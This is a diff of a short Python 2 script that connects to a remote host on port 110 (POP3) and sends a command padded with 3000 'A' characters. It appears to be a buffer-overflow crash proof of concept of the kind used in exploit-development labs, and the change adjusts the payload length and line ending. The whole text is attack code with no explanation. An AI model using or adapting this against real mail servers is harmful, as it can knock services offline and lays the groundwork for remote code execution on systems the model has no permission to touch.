@@ -10,22 +10,15 @@ RPORT = 110
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((RHOST,RPORT))
 
-data = s.recv(1024)
-
 #build a message
 
 buf = ""
-buf += "A"*2700
-buf += "\n"
+buf += "A"*3000
+buf += "\r\n"
 
 #send the message
-s.send("VALUE" + buf)
+s.send("VALUE " + buf)
 
-#receive some data from socket
-data = s.recv(1024)
-
-#print out what received
-print "Received: {0}".format(data)
+s.recv(1024)
 
 s.close()
-
